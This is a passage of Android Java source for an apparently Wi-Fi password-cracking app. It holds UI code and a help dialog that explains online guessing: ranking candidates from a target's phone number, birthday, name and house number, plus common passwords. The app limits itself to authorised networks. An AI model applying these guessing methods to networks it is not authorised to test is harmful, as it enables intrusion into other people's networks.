        flowLabel.setText(L.s("攻击流", "CANDIDATES"));
        LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        flp.leftMargin = px(6);
        flowHeader.addView(flowLabel, flp);

        flowCount = new TextView(this);
        flowCount.setTextSize(11);
        flowCount.setTextColor(AmberTheme.TEXT_FAINT);
        LinearLayout.LayoutParams fcp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        fcp.rightMargin = px(12);
        flowHeader.addView(flowCount, fcp);

        chipKey = new TextView(this);
        chipKey.setText(L.s("关键", "Key"));
        chipKey.setTextSize(11);
        chipKey.setPadding(px(9), px(4), px(9), px(4));
        chipKey.setClickable(true);
        chipKey.setFocusable(true);
        chipKey.setOnClickListener(v -> {
            streamKeyOnly = true;
            styleFlowChips();
            renderStream();
        });
        LinearLayout.LayoutParams ckp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ckp.rightMargin = px(6);
        flowHeader.addView(chipKey, ckp);

        chipAll = new TextView(this);
        chipAll.setText(L.s("全部", "All"));
        chipAll.setTextSize(11);
        chipAll.setPadding(px(9), px(4), px(9), px(4));
        chipAll.setClickable(true);
        chipAll.setFocusable(true);
        chipAll.setOnClickListener(v -> {
            streamKeyOnly = false;
            styleFlowChips();
            renderStream();
        });
        LinearLayout.LayoutParams chp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        chp.rightMargin = px(10);
        flowHeader.addView(chipAll, chp);
        styleFlowChips();

        flowClear = new TextView(this);
        flowClear.setText(L.s("清空", "Clear"));
        flowClear.setTextSize(11);
        flowClear.setTextColor(DANGER);
        flowClear.setPadding(px(10), px(4), px(10), px(4));
        flowClear.setBackground(roundBg(AmberTheme.DANGER_BG, AmberTheme.RADIUS_CHIP));
        flowClear.setOnClickListener(v -> {
            streamBuffer.clear();          // SpannableStringBuilder 用 clear()
            streamBuffer.clearSpans();     // 一起清掉残留的颜色 span
            streamLines.clear();           // 全量列表也清，否则切「全部」会又冒出来
            if (connectStreamView != null) connectStreamView.setText("");
            updateFlowHeader();
            updateJumpLatest();
            updateEmptyHint();
            applyStreamHeight();           // 清空后收起日志区，不留一大块空白
            Toast.makeText(this, L.s("现场已清空", "Log cleared"),
                    Toast.LENGTH_SHORT).show();
        });
        flowClear.setClickable(true);
        flowClear.setFocusable(true);
        flowHeader.addView(flowClear);

        flowHeader.setOnClickListener(v -> toggleStream());
        eventCard.addView(flowHeader);

        connectStreamView = new TextView(this);
        connectStreamView.setTextSize(12);
        connectStreamView.setTextColor(TEXT_DIM);
        connectStreamView.setTypeface(Typeface.MONOSPACE);
        connectStreamView.setPadding(px(14), px(12), px(14), px(12));
        // 不要开 setTextIsSelectable：
        // 可选模式的 TextView 会把滑动手势吃掉（它要处理文本选择），
        // 表现就是「日志滚不动」。需要复制时用「导出日志」。
        connectStreamView.setTextIsSelectable(false);
        connectStreamView.setLineSpacing(px(4), 1f);
        connectStreamView.setHorizontallyScrolling(false);

        streamScroll = new android.widget.ScrollView(this);
        streamScroll.setBackground(roundBgStatic(SUNKEN, AmberTheme.RADIUS_CARD));
        streamScroll.setFillViewport(true);
        streamScroll.setVerticalScrollBarEnabled(true);
        streamScroll.setScrollBarStyle(android.view.View.SCROLLBARS_INSIDE_INSET);
        streamScroll.setScrollbarFadingEnabled(false);
        streamScroll.setOverScrollMode(android.view.View.OVER_SCROLL_ALWAYS);
        streamScroll.addView(connectStreamView);

        // 手指落在日志区时明确告诉外层「这段手势归我」，否则外层 ScrollView 会截走滑动。
        streamScroll.setOnTouchListener((v, e) -> {
            if (e.getAction() == android.view.MotionEvent.ACTION_DOWN) {
                v.getParent().requestDisallowInterceptTouchEvent(true);
                streamAutoScroll = false;
                updateJumpLatest();
            } else if (e.getAction() == android.view.MotionEvent.ACTION_UP
                    || e.getAction() == android.view.MotionEvent.ACTION_CANCEL) {
                v.getParent().requestDisallowInterceptTouchEvent(false);
                android.view.View child = streamScroll.getChildAt(0);
                if (child != null
                        && streamScroll.getScrollY() + streamScroll.getHeight()
                           >= child.getMeasuredHeight() - px(24)) {
                    streamAutoScroll = true;
                }
                updateJumpLatest();
            }
            return false;
        });

        streamParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(300));

        // 「回到最新」浮标固定在日志区右下角内侧（不压工具条）。
        android.widget.FrameLayout streamWrap = new android.widget.FrameLayout(this);
        streamWrapView = streamWrap;
        streamWrap.addView(streamScroll, new android.widget.FrameLayout.LayoutParams(
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

        jumpLatestBtn = new TextView(this);
        jumpLatestBtn.setText(L.s("↓ 最新", "↓ Latest"));
        jumpLatestBtn.setTextSize(11f);
        jumpLatestBtn.setTextColor(ON_ACCENT);
        jumpLatestBtn.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        jumpLatestBtn.setPadding(px(12), px(6), px(12), px(6));
        jumpLatestBtn.setBackground(roundBg(ACCENT, AmberTheme.RADIUS_CHIP));
        jumpLatestBtn.setVisibility(View.GONE);
        jumpLatestBtn.setOnClickListener(v -> {
            streamAutoScroll = true;
            if (streamScroll != null) {
                streamScroll.post(() ->
                        streamScroll.fullScroll(android.view.View.FOCUS_DOWN));
            }
            updateJumpLatest();
        });
        android.widget.FrameLayout.LayoutParams jflp =
                new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT);
        jflp.gravity = Gravity.BOTTOM | Gravity.END;
        jflp.rightMargin = px(12);
        jflp.bottomMargin = px(12);
        streamWrap.addView(jumpLatestBtn, jflp);

        eventCard.addView(streamWrap, streamParams);

        // 空状态引导：与日志区**二选一**显示，不再各占一块。
        connectEmptyHint = new TextView(this);
        connectEmptyHint.setTextSize(AmberTheme.FS_BODY);
        connectEmptyHint.setTextColor(TEXT_DIM);
        connectEmptyHint.setGravity(Gravity.CENTER);
        connectEmptyHint.setPadding(px(16), px(22), px(16), px(22));
        connectEmptyHint.setBackground(roundBgStatic(SUNKEN, AmberTheme.RADIUS_CARD));
        eventCard.addView(connectEmptyHint);
        updateEmptyHint();

        pageConnect.addView(eventCard, cardLp(AmberTheme.GAP_CARD));

        // ================= ⑥ 底部操作卡 =================
        actionsCard = AmberTheme.card(this, dp, R);
        LinearLayout actions = new LinearLayout(this);
        actions.setOrientation(LinearLayout.HORIZONTAL);

        startBtn = primaryAction(L.s("▶ 开始", "▶ Start"), ACCENT, ON_ACCENT);
        startBtn.setOnClickListener(v -> startConnect());
        actions.addView(startBtn, actParams(0, 1.6f));

        pauseBtn = primaryAction(L.s("‖ 暂停", "‖ Pause"), AmberTheme.NEUTRAL_BG);
        pauseBtn.setOnClickListener(v -> onPauseResumeClicked());
        actions.addView(pauseBtn, actParams(8, 1f));

        stopBtn = primaryAction(L.s("■ 停止", "■ Stop"), AmberTheme.DANGER_BG, DANGER);
        stopBtn.setOnClickListener(v -> onStopClicked());
        actions.addView(stopBtn, actParams(8, 1f));
        actionsCard.addView(actions);

        actionsHint = AmberTheme.label(this, "");
        LinearLayout.LayoutParams ahlp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        ahlp.topMargin = px(9);
        actionsCard.addView(actionsHint, ahlp);

        pageConnect.addView(actionsCard, cardLp(AmberTheme.GAP_CARD));

        // 队列（多目标才有意义，空时不占位置）
        queueBox = new LinearLayout(this);
        queueBox.setOrientation(LinearLayout.VERTICAL);
        queueBox.setPadding(0, px(AmberTheme.GAP_CARD), 0, 0);
        pageConnect.addView(queueBox);

        // 开关与高级设置仍收在弹窗里，主界面不再占位置
        smartToggle = null;
        targetDictToggle = null;

        // 初始化显示（与改版前同一组调用，顺序一致）
        updateTargetLabel();
        updateConnectDict();
        updateConnectMode();
        renderProgressCardState();
        applyStreamHeight();
        updateFlowHeader();
        refreshQueue();
    }

    /** 卡片在页面里的通用外间距（卡片之间保持一致的视觉间距） */
    private LinearLayout.LayoutParams cardLp(int topMarginDp) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        if (topMarginDp > 0) lp.topMargin = px(topMarginDp);
        return lp;
    }

    /** 静态圆角面（卡片内部、日志底）：无可点语义，不加波纹 */
    private android.graphics.drawable.Drawable roundBgStatic(int color, float radiusDp) {
        return io.github.wlmosv_png.wpaforge.ui.UiKit.round(color, dp(radiusDp));
    }

    /**
     * 进度卡的「当前状态」大字与底部可用性说明。
     *
     * <p><b>只读现有状态</b>：队列里任务的真实 {@code state} + 服务是否在跑 +
     * 最近一次任务的真实 outcome。这里不新增状态位、不推断「成功/失败」，
     * 也不把「未知」写成「正常」。
     */
    private void renderProgressCardState() {
        String text;
        int color;
        /* 状态**以队列为准**，服务是否存活只用来决定"能不能点开始"。
         *
         * <p>踩过的坑：`running || st == RUNNING` 里的 running 取自
         * {@code CrackService.isRunning()}，而那个标志在任务正常跑完后**仍然是 true**
         * （服务实例还活着，只有 STOPPED 才会置回 false）。
         * 结果就是——跑完了、去看别的字典、返回，界面又变回「运行中 100%」，
         * 用户在等一个永远不会来的结果。**跑完了是什么就该显示什么。** */
        boolean serviceRunning = CrackService.isRunning();
        TaskQueue.State st = null;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING || t.state == TaskQueue.State.PENDING) {
                st = t.state;
                break;
            }
        }
        if (st == null) {
            for (TaskQueue.Task t : queueCache) {
                if (t.state == TaskQueue.State.PAUSED) { st = t.state; break; }
            }
        }
        if (st == TaskQueue.State.PAUSED) {
            text = L.s("已暂停 · 进度已保留", "Paused · progress kept");
            color = ACCENT;
        } else if (st == TaskQueue.State.RUNNING) {
            // 只有"队列里真有任务在跑"才叫运行中/收尾中
            text = finishingNow
                    ? L.s("收尾中", "Finishing up")
                    : L.s("运行中", "Running");
            color = ACCENT;
        } else if (st == TaskQueue.State.PENDING) {
            text = L.s("准备中", "Preparing");
            color = ACCENT;
        } else if (!lastOutcomeLabel.isEmpty()) {
            text = lastOutcomeLabel;
            color = lastOutcomeColor;
        } else {
            text = L.s("空闲 · 未开始", "Idle · not started");
            color = AmberTheme.TEXT_DIM;
        }
        if (stateBig != null) {
            stateBig.setText(text);
            stateBig.setTextColor(color);
        }
        if (actionsHint != null) {
            /* 提示行必须和状态行说同一件事。
             *
             * <p>同类矛盾：上一版用服务存活来判 canStart，于是跑完那一刻
             * 状态行已经写「已结束 · 未命中」，提示行却还挂着「任务进行中」——
             * 同一张卡里两句话互相打脸。
             *
             * <p>现在按**队列事实**判；服务侧本来就有自我保护
             * （{@code startQueue()} 见 worker 还活着会拒绝并记一行日志），
             * 所以这里可以放行，不会真的开出两次任务。 */
            boolean canStart = st == null || st == TaskQueue.State.PAUSED;
            actionsHint.setText(!canStart
                    ? L.s("任务进行中 · 可暂停或停止", "Task active · pause or stop")
                    : serviceRunning
                        ? L.s("上一轮还在收尾 · 现在点开始会排在它后面",
                              "previous run is wrapping up; start will queue behind it")
                        : L.s("可以开始 · 开始前会先登记目标配置",
                              "Ready · the target config is saved first"));
            actionsHint.setTextColor(AmberTheme.TEXT_FAINT);
        }
    }

    // ================================================================ 结算卡

    /**
     * 跑完之后给结论。
     *
     * <p>设计要点（用户提的"跑完还没出来，用户觉得是垃圾"）：
     *  1. **把"没中"当成一等公民**：它是一个正常、明确、可解释的结果，不是空状态；
     *  2. **三种"没中"必须分开**：全部有结论 ≠ 有 N 条无结论 ≠ 没跑完。
     *     跟判定链"宁可报不确定，也不报假成功"是同一条原则；
     *  3. **用本机真实战绩当依据**，而不是空口安慰；
     *  4. **给下一步**，并且允许放弃（不给退路，用户只会卸载）。
     */
    private void showResultCard(TaskQueue.Task task, String outcome) {
        if (resultCard == null || task == null) return;
        /* 主线程守卫：这个方法碰一堆 View，一旦被工作线程调到就是
         * CalledFromWrongThreadException。与其在调用方逐处小心，
         * 不如让它自己纠正 —— 只要不是在主线程，就转投过去。 */
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            final TaskQueue.Task t = task;
            final String o = outcome;
            ui.post(() -> showResultCard(t, o));
            return;
        }
        if ("DONE_HIT".equals(outcome)) {
            resultCard.setVisibility(View.GONE);   // 命中已经有专门的命中卡
            return;
        }
        final int tested = task.testedThisRun;
        final int total = task.dictSize;
        final int inconclusive = task.missInconclusive;
        final String ssid = task.ssid == null ? "" : task.ssid;

        String title;
        int titleColor;
        if ("PAUSED".equals(outcome)) {
            title = L.s("试到第 " + Math.max(task.offset, tested) + " 条停了",
                    "Stopped at candidate " + Math.max(task.offset, tested));
            titleColor = ACCENT;
        } else if ("STOPPED".equals(outcome)) {
            title = L.s("已停止 · 试了 " + tested + " 条", "Stopped after " + tested);
            titleColor = AmberTheme.TEXT_DIM;
        } else if (tested == 0 && total > 0) {
            title = L.s("这本字典的候选都跑过了", "Every candidate here was already tried");
            titleColor = ACCENT;
        } else if (inconclusive > 0) {
            title = L.s("跑完了，但有 " + inconclusive + " 条没结论",
                    "Finished, but " + inconclusive + " had no verdict");
            titleColor = ACCENT;
        } else {
            title = L.s("这本字典里没有", "Not in this dictionary");
            titleColor = TEXT;      // 中性色：这是正常结果，不是错误
        }
        resultTitle.setText(title);
        resultTitle.setTextColor(titleColor);

        StringBuilder sub = new StringBuilder();
        sub.append(L.s("试了 " + tested + " 条", tested + " tried"));
        if (total > 0) sub.append(L.s(" · 这本共 " + total + " 条", " of " + total));
        sub.append(L.s(" · 用了 ", " \u00b7 took ")).append(fmtDuration(task.elapsedMs));
        resultSub.setText(sub.toString());

        // 「为什么」——这里必须说人话，而且优先用本机真实数据
        StringBuilder why = new StringBuilder();
        if ("PAUSED".equals(outcome)) {
            why.append(L.s("进度已经存下来了，点「继续」接着跑，不会从头再来。",
                    "Progress is saved \u2014 Resume continues from here."));
        } else if (tested == 0 && total > 0) {
            why.append(L.s("这本字典的候选以前都试过，所以这次没有可跑的新候选。"
                            + "\n换一本字典就行，已经跑过的不会重复跑。",
                    "All candidates in this dictionary were tried before, so there was nothing "
                            + "new to run. Just pick another dictionary \u2014 tried ones are skipped."));
        } else if (inconclusive > 0) {
            why.append(L.s("没结论 = 路由器没给出明确答复（信号弱、响应慢、或中途换过信道）。"
                            + "这些**不算被排除**，下次跑同一本会重新试它们。",
                    "No verdict means the router gave no clear answer (weak signal, slow reply, "
                            + "or a channel change). These are NOT ruled out and will be retried."));
        } else {
            why.append(L.s("破解是逐条试，试完没有就是没有 —— 这不是故障。"
                            + "\n家用密码最常见的是手机号、生日、门牌，这些大多不在这本字典里。",
                    "Cracking is one candidate at a time: exhausted means exhausted. "
                            + "Home passwords are usually a phone number, birthday or house "
                            + "number \u2014 most of those are not in this list."));
            String rec = localTrackRecord();
            if (!rec.isEmpty()) why.append("\n").append(rec);
            String top = topHitDictName();
            if (!top.isEmpty()) {
                why.append("\n").append(L.s("本机命中最多的是「" + top + "」—— 换这本通常更划算",
                        "Most hits on this device came from \"" + top + "\" \u2014 usually a better bet"));
            }
        }
        io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
        if (tried.size() > 0) {
            why.append("\n").append(L.s("本网络累计已排除 " + tried.size() + " 条（下次不会重复跑）",
                    tried.size() + " candidates ruled out on this network so far"));
        }
        if (!lastRestoreSummary.isEmpty()) {
            why.append("\n").append(L.s("收尾完成 · 原来的网络已写回（", "Wrap-up done \u00b7 previous network restored (")
                    + lastRestoreSummary + "）");
        }
        resultWhy.setText(why.toString());

        resultActions.removeAllViews();
        resultActions.addView(actionButton(L.s("填线索再试", "Add hints & retry"),
                AmberTheme.BTN_PRIMARY, 0, v -> {
                    hideResultCard();
                    showSeedDialog();
                }));
        resultActions.addView(actionButton(L.s("换更大的字典", "Bigger dictionary"),
                AmberTheme.BTN_SECONDARY, 8, v -> {
                    hideResultCard();
                    showDictSource();
                }));
        resultActions.addView(actionButton(L.s("先算了", "Leave it"),
                AmberTheme.BTN_NEUTRAL, 8, v -> hideResultCard()));

        resultCard.setVisibility(View.VISIBLE);
        // 候选区还留着最后一条 —— 标题换成陈述事实的词，明确告诉用户已经结束。
        // 刻意不用「完成」：没找到不算完成，用「最后尝试」只说发生过什么。
        if (candLabel != null) {
            candLabel.setText(L.s("最后尝试", "LAST TRIED"));
        }
    }

    /**
     * 结算卡上的按钮。
     *
     * <p>**为什么要有这个工厂**：`AmberTheme.action()` 造出来的 Button
     * 是没有 layoutParams 的，直接 `(LinearLayout.LayoutParams) b.getLayoutParams()`
     * 拿到 null，再写 leftMargin 就 NPE。线上日志抓到过这个崩
     * （`showResultCard` 抛 NullPointerException → 结果卡没出来，
     * 界面永远停在"收尾中"，看起来就是卡死）。
     * 所以这里永远新建一套 LP 再挂上去。
     */
    private Button actionButton(String label, int kind, int leftMarginDp,
                                android.view.View.OnClickListener l) {
        Button b = AmberTheme.action(this, dp, label, kind);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.leftMargin = px(leftMarginDp);
        b.setLayoutParams(lp);
        b.setOnClickListener(l);
        return b;
    }

    private void hideResultCard() {
        if (resultCard != null) resultCard.setVisibility(View.GONE);
        /* **不重置候选区标题**。
         * 之前这里会把标题改回「当前候选」，于是用户点「先算了」之后，
         * 一张写着"已结束 · 未命中"的卡下面挂着"当前候选"——两句话打架。
         * 标题只由 startConnect（开跑）和 showResultCard（结束）两处决定。 */
    }

    /**
     * 本机**命中最多的那本字典**。
     *
     * <p>从历史记录里数出来（命中的记录带 dictName），用于在"没中"时给一条
     * **可执行的**建议 —— 而不是只说"再试试别的"。数据本来就在盘上，不用新增存储。
     *
     * @return 形如 {@code 01 内置弱口令常用（57 次）}；样本太少返回空串
     */
    private io.github.wlmosv_png.wpaforge.audit.HistStore.Summary histSummary;
    private long histSummaryAt = 0L;

    /**
     * 历史统计（带缓存）。
     *
     * <p>**不解密**：走 {@code HistStore.summary()} —— 只解析前 8 列。
     * 之前这里调了两次 {@code load()}，而 load 会对每条命中记录走一次
     * Keystore 解密（用户 107 条命中 = 200+ 次），弹窗因此卡一下。
     * 缓存 30 秒，避免反复读盘。
     */
    private io.github.wlmosv_png.wpaforge.audit.HistStore.Summary histSummary() {
        long now = System.currentTimeMillis();
        if (histSummary == null || now - histSummaryAt > 30_000L) {
            histSummary = io.github.wlmosv_png.wpaforge.audit.HistStore.summary(this);
            histSummaryAt = now;
        }
        return histSummary;
    }

    /** 本机命中最多的字典（形如 {@code 01 内置弱口令常用（57 次）}）；样本不足返回空串 */
    private String topHitDictName() {
        io.github.wlmosv_png.wpaforge.audit.HistStore.Summary s = histSummary();
        if (s.topDict.isEmpty()) return "";
        return s.topDict + L.s("（" + s.topDictHits + " 次）", " (" + s.topDictHits + " hits)");
    }

    /** 本机真实战绩：跑过多少次、命中多少次 —— 比任何安慰话都有说服力 */
    private String localTrackRecord() {
        try {
            io.github.wlmosv_png.wpaforge.audit.HistStore.Summary s = histSummary();
            if (s.runs == 0) return "";
            return L.s("本机记录：跑过 " + s.runs + " 次，命中 " + s.hits + " 次"
                            + (s.hits > 0 ? " —— 工具是能中的，只是这次方向不对。" : "。"),
                    "On this device: " + s.runs + " runs, " + s.hits + " hits.");
        } catch (Throwable t) {
            return "";
        }
    }

    private static String fmtDuration(long ms) {
        if (ms <= 0) return "—";
        long sec = ms / 1000;
        if (sec < 60) return L.s(sec + " 秒", sec + "s");
        if (sec < 3600) return L.s((sec / 60) + " 分 " + (sec % 60) + " 秒",
                (sec / 60) + "m " + (sec % 60) + "s");
        return L.s((sec / 3600) + " 小时 " + ((sec % 3600) / 60) + " 分",
                (sec / 3600) + "h " + ((sec % 3600) / 60) + "m");
    }

    /**
     * 破解原理说明（「?」入口）。
     *
     * <p>七节，按"从是什么到为什么"排：
     *   ① 它在干什么 ② 为什么不用大字典 ③ 候选从哪来（含社会工程学判断基准）
     *   ④ 判断依据（判定链） ⑤ 没中是怎么回事（+本机真实数字）
     *   ⑥ 现实里会让它失效的三件事 ⑦ 边界
     *
     * <p>末尾两个跳转直接接上已有能力（填线索 / 选字典），形成闭环。
     */
    private void showCrackHelp() {
        StringBuilder b = new StringBuilder();

        b.append(L.s("① 它在干什么\n"
                        + "把\"人可能设的密码\"按可能性从高到低，一条一条**真的去连一次**。\n"
                        + "连上了，那条就是对的。\n\n",
                "1) What it does\nRanks likely passwords and **really tries them, one by one**. "
                        + "If the join succeeds, that one is right.\n\n"));

        b.append(L.s("② 为什么不翻几十万条大字典\n"
                        + "Android 一次只能连一个网络，每条要 2~4 秒。10 万条按 3 秒算 ≈ 83 小时。\n"
                        + "所以关键不是\"字典多大\"，而是**最可能的那几十条有没有排在最前面**。\n\n",
                "2) Why not a 100k-entry list\nAndroid can only be on one network at a time, "
                        + "2\u20134s per try. 100k entries \u2248 83 hours.\n"
                        + "So it is not about list size \u2014 it is about putting the most likely "
                        + "few dozen first.\n\n"));

        b.append(L.s("③ 候选从哪来（三层）\n"
                        + "· 你填的线索（最准）：手机号 / 生日 / 姓名拼音 / 门牌\n"
                        + "  —— 这些**不在任何字典里**，只有你知道\n"
                        + "· 中文高频：5201314、woaini520、zhangwei123\n"
                        + "· 通用短表：12345678、88888888、admin123 —— 跨设备命中率最高\n\n"
                        + "为什么一个手机号只出 3 种形态？\n"
                        + "人对密码的改动**极小**：一个手机号通常只会写成 全号 / 后 8 位 / 前面加个 1。"
                        + "主流工具（CUPP、hashcat 规则集）也只做这几种。\n"
                        + "把它来回变形——截中间几位、补个零、尾号重复——只会造出**没人用过的串**，"
                        + "白占一次尝试。\n"
                        + "所以派生的准则是：**值少但准**（每个线索最多 3 条），靠"
                        + "**维度之间互拼**扩展（zhangwei + 门牌 → zhangwei802），"
                        + "而不是对单个值反复变形。\n\n",
                "3) Where candidates come from\n"
                        + "\u00b7 Your hints (most accurate): phone / birthday / pinyin / house no.\n"
                        + "  These are in no wordlist \u2014 only you know them.\n"
                        + "\u00b7 Chinese high-frequency: 5201314, woaini520, zhangwei123\n"
                        + "\u00b7 Common short list: 12345678, 88888888, admin123\n\n"
                        + "Why only 3 forms per phone number?\n"
                        + "People modify passwords **very little**. A phone number is usually "
                        + "typed as-is, its last 8 digits, or with a leading 1. Established tools "
                        + "do the same.\n"
                        + "Reshaping it (slicing the middle, padding zeros, repeating the tail) "
                        + "only produces strings **nobody ever used**.\n"
                        + "So the rule is: **few but right**, expanded by **combining facts** "
                        + "(name + house no.), not by mangling one value.\n\n"));

        b.append(L.s("④ 判断依据（本项目最讲究的地方）\n"
                        + "\"看起来连上了\" ≠ \"这条密码对\"。回连旧网、缓存凭据、旧配置，"
                        + "都能让状态显示 COMPLETED。\n"
                        + "所以只认一种证据：**SSID 逐字相等 + supplicant COMPLETED + 拿到有效 IP**，"
                        + "三条必须**来自同一行状态**。\n"
                        + "宁可报\"不确定\"，也不报\"成功\"。\n\n",
                "4) How success is decided (the strict part)\n"
                        + "\"It looks connected\" \u2260 \"this password is right\". Reconnecting to "
                        + "an old network, cached credentials or stale config can all show COMPLETED.\n"
                        + "So only one piece of evidence counts: **SSID exact match + supplicant "
                        + "COMPLETED + a valid IP**, all three **from the same status line**.\n"
                        + "It would rather say \"unknown\" than claim a false success.\n\n"));

        StringBuilder miss = new StringBuilder();
        miss.append(L.s("⑤ 没中是怎么回事\n"
                        + "· 没中是**常态**，不是故障\n"
                        + "· 三种没中要分开：这本里确实没有 / 有 N 条没结论（**不算排除**）/ 没跑完\n"
                        + "· 试过的会被记住（**按网络分开**），换字典不会重复跑\n",
                "5) What \"no match\" means\n"
                        + "\u00b7 No match is the **normal** outcome, not a failure\n"
                        + "\u00b7 Three kinds: truly not in this list / N inconclusive "
                        + "(**not ruled out**) / not finished\n"
                        + "\u00b7 Tried candidates are remembered **per network**, so switching "
                        + "lists does not re-run them\n"));
        String rec = localTrackRecord();
        if (!rec.isEmpty()) miss.append(L.s("\n本机记录：", "\nOn this device: ")).append(rec);
        String top = topHitDictName();
        if (!top.isEmpty()) {
            miss.append(L.s("\n本机命中最多的是「" + top + "」—— 换这本通常更划算",
                    "\nMost hits here came from \"" + top + "\""));
        }
        b.append(miss).append("\n\n");

        b.append(L.s("⑥ 现实里会让它失效的三件事\n"
                        + "· 目标开了 **WPA3 / PMF**：靠\"猜密码去连\"打不动，会一直失败\n"
                        + "· 密码**不在候选集合**里：跑完也没中 → 补线索，或换更大的字典\n"
                        + "· **信号弱 / 距离远**：会出现大量\"没结论\"——不是密码错，是没拿到证据\n\n",
                "6) Three real-world blockers\n"
                        + "\u00b7 Target uses **WPA3 / PMF**: guessing by connecting will just fail\n"
                        + "\u00b7 The password is **not in the candidate set**: add hints or use "
                        + "a bigger list\n"
                        + "\u00b7 **Weak signal / far away**: lots of \"inconclusive\" results \u2014 "
                        + "not a wrong password, just no evidence\n\n"));

        b.append(L.s("⑦ 边界\n只用于**你自己拥有或已获授权**的网络。对别人的网就是违法。",
                "7) Scope\nFor networks **you own or are explicitly authorised to test** only."));

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("这是怎么破解的？", "How does this work?"), b.toString());
        d.addItem(L.s("去填线索（提高命中率）", "Add hints (raises hit rate)"),
                dd -> showSeedDialog());
        d.addItem(L.s("怎么选字典", "Which wordlist to pick"), dd -> showDictSource());
        d.setPositive(L.s("知道了", "Got it"), null);
        d.show();
    }

    /** 一条淡分隔线，用于把顶部状态卡里的几行分开 */
    private View divider() {
        View v = new View(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, Math.max(1, px(0.6f)));
        lp.topMargin = px(9);
        lp.bottomMargin = px(1);
        v.setLayoutParams(lp);
        v.setBackgroundColor(AmberTheme.HAIRLINE);
        return v;
    }

    /** 底部操作按钮（默认白字） */
    private Button primaryAction(String label, int bg) {
        return primaryAction(label, bg, Color.WHITE);
    }

    /** 底部操作按钮：可指定文字色（琥珀底必须用深色，白字对比度不够） */
    private Button primaryAction(String label, int bg, int fg) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setTextSize(14.5f);
        b.setTextColor(fg);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setMinWidth(0); b.setMinimumWidth(0);
        b.setMinHeight(0); b.setMinimumHeight(0);
        b.setStateListAnimator(null);
        b.setPadding(px(8), px(15), px(8), px(15));
        b.setBackground(roundBg(bg, AmberTheme.RADIUS_BTN));
        return b;
    }

    private LinearLayout.LayoutParams actParams(int rightMargin, float weight) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, weight);
        lp.rightMargin = px(rightMargin);
        return lp;
    }

    /**
     * 把当前内存里的候选写成一个真实文件，返回路径。
     *
     * 目录用 DictStore.defaultDir（跟字典管理页同一个），文件名固定，
     * 下次生成会覆盖 —— 不会堆一堆临时文件。
     */
    private String persistGeneratedDict() {
        if (currentDict == null || currentDict.isEmpty()) return "";
        File dir = io.github.wlmosv_png.wpaforge.audit.DictStore.defaultDir(this);
        if (dir == null) return "";
        if (!dir.exists() && !dir.mkdirs()) return "";
        // 规范名走 DerivedDicts：历史上有过 `00 内置生成器.txt` 这第二个名字，
        // 结果目录里长期躺着两份同样的内容
        String genName = io.github.wlmosv_png.wpaforge.audit.DerivedDicts.generatorName();
        purgeSameGroup(dir, genName + ".txt");
        File out = new File(dir, genName + ".txt");
        try (java.io.BufferedWriter w = new java.io.BufferedWriter(
                new java.io.OutputStreamWriter(new java.io.FileOutputStream(out), "UTF-8"))) {
            for (Candidate c : currentDict) {
                w.write(c.password);
                w.write("\n");
            }
        } catch (Exception e) {
            android.util.Log.w("WPAForge", "persistGeneratedDict 失败: " + e);
            return "";
        }
        appendStream(L.s("内置字典已落地: ", "Generated dictionary saved: ")
                + out.getAbsolutePath() + "（" + currentDict.size() + L.s(" 条）", " entries)"));
        return out.getAbsolutePath();
    }

    /** 暂停 / 继续 的统一入口 */
    private void onPauseResumeClicked() {
        TaskQueue.Task pausedTask = null, runningTask = null;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.PAUSED && pausedTask == null) pausedTask = t;
            if (t.state == TaskQueue.State.RUNNING && runningTask == null) runningTask = t;
        }
        if (pausedTask != null && runningTask == null) {
            resumeTask(pausedTask);
            appendStreamColored(L.s("▶ 恢复执行…", "▶ Resuming…"), OK_GREEN);
        } else if (runningTask != null) {
            CrackService svc = liveService();
            if (svc != null) svc.pause();
            appendStreamColored(L.s("‖ 正在暂停…（进度保留）",
                    "‖ Pausing… (progress kept)"), ACCENT);
            refreshQueue();
        } else {
            Toast.makeText(this, L.s("当前没有正在跑的任务", "No task is running"),
                    Toast.LENGTH_SHORT).show();
        }
    }

    /** 停止的统一入口 */
    private void onStopClicked() {
        boolean active = false;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING
                    || t.state == TaskQueue.State.PENDING
                    || t.state == TaskQueue.State.PAUSED) { active = true; break; }
        }
        if (!active) {
